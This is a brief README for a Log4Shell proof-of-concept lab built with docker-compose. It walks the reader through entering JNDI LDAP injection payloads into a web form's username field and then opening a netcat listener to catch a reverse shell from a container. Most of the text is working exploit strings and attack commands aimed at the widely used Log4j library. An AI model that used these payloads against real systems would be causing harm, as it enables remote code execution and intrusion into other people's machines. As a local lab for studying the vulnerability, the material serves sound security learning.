## Log4shell proof of concept

To start:
```docker-compose up```

Go go localhost:8000 and fill into username:

```${jndi:ldap://exploit:9999/Evil}```


Go back and fill another time:
```${jndi:ldap://remote-code-execution:1389/a}```


Start terminal in Ubuntu:
```docker exec -it log4shell-equinor-ubuntu-1 bash```
Listen for reverse shell:
```nc -lvnp 9001```
